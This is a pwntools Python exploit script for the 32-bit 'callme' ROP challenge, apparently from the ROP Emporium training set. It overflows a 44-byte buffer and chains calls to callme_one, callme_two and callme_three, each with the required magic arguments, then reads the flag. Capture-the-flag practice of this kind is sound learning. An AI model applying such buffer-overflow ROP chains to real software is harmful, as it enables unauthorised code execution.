#!/usr/bin/env python3

from pwn import *

exe = ELF("callme32_patched")
libc = ELF("./libcallme32.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    # parameters = 0xdeadbeef, 0xcafebabe, 0xd00df00d

    offset = 44
    cmeone = 0x080484f0
    cmetwo = 0x08048550
    cmethree = 0x080484e0
    pop = 0x080487f9
    payload = flat(b'A'*offset + p32(cmeone) + p32(pop) + p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d) + p32(cmetwo) + p32(pop) + p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d) + p32(cmethree)  + p32(pop) + p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d))

    r.sendlineafter(b'>', payload)

    r.recvline()
    r.recvline()
    r.recvline()
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
